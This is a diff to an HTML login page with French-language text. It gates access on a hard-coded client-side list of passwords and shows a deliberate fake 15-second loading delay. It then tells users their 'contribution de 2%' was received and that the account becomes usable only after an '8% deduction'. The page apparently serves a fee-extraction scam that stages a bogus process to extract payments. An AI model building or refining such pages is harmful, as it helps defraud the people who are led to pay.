@@ -14,20 +14,10 @@
             margin: 0;
             font-family: Arial, sans-serif;
             position: relative;
-            background-color: white;
-            color: darkblue;
-            animation: fadeIn 2s ease-in-out;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
         }
         .container {
             text-align: center;
-            background-color: #f0f8ff;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            color: darkblue;
         }
         #small-logo {
             width: 50px;
@@ -78,19 +68,10 @@
             padding: 10px;
             width: 200px;
             border: 2px solid darkblue;
-            border-radius: 5px;
         }
         button {
             padding: 10px 20px;
             cursor: pointer;
-            background-color: darkblue;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            transition: background-color 0.3s ease;
-        }
-        button:hover {
-            background-color: navy;
         }
         #message {
             display: none;
@@ -119,6 +100,7 @@
                 <option value="bn">বাংলা</option>
                 <option value="ja">日本語</option>
                 <option value="ko">한국어</option>
+                <!-- Ajouter plus de langues si nécessaire -->
             </select>
         </div>
         <div id="loader">
@@ -175,26 +157,21 @@
                 loader.style.display = 'none';
                 if (validPasswords.includes(password)) {
                     if (!usedPasswords[password]) {
-                        usedPasswords[password] = [];
-                    }
-
-                    if (usedPasswords[password].includes(email)) {
-                        message.innerHTML = "Nous vous remercions pour votre contribution de 2%, veuillez patienter la finalisation du processus de connexion.";
-                        message.style.display = 'block';
-                        // Démarrer le compte à rebours de 72 heures ici
-                    } else if (usedPasswords[password].length < 2) {
-                        usedPasswords[password].push(email);
-                        message.innerHTML = "Nous vous remercions pour votre contribution de 2%, veuillez patienter la finalisation du processus de connexion.";
-                        message.style.display = 'block';
-                        // Démarrer le compte à rebours de 72 heures ici
+                        usedPasswords[password] = email;
+                        message.innerHTML = "Nous vous remercions pour votre contribution de 2%, veuillez patienter la finalisation du déduction de 8%, votre compte sera opérationnel une fois être déduit.";
+                    } else if (usedPasswords[password] === email) {
+                        message.innerHTML = "Nous vous remercions pour votre contribution de 2%, veuillez patienter la finalisation du déduction de 8%, votre compte sera opérationnel une fois être déduit.";
                     } else {
-                        message.innerHTML = "Ce mot de passe a déjà été utilisé deux fois.";
-                        message.style.display = 'block';
+                        message.innerHTML = "";
+                        contactMessage.style.display = 'block';
                     }
                 } else {
+                    message.innerHTML = "";
                     contactMessage.style.display = 'block';
                 }
-            }, 15000); // 15 secondes de délai pour la simulation du chargement
+
+                message.style.display = 'block';
+            }, 15000); // simulate loading time
         }
     </script>
 </body>
